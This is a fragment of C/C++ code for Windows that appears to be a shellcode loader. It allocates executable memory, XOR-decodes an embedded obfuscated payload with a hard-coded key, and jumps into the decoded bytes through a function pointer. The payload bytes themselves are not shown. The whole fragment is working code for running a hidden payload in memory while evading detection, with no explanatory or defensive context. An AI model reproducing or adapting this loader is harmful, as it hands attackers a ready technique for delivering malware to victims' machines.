    OutputDebugString(L"stuff() called");

    char* exec = (char*)VirtualAlloc(0, CANADIAN_MAP_xor_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    char key[] = "3dbc6098-118a-11ed-861d-0242ac120002";
    int j = 0;
    for (int i = 0; i < CANADIAN_MAP_xor_len; i++) {
        if (j == sizeof key - 1) j = 0;

        exec[i] = ((char*)CANADIAN_MAP_xor)[i] ^ key[j];
        j++;
    }

    OutputDebugString(L"calling function pointer");
    ((void(*)())exec)();

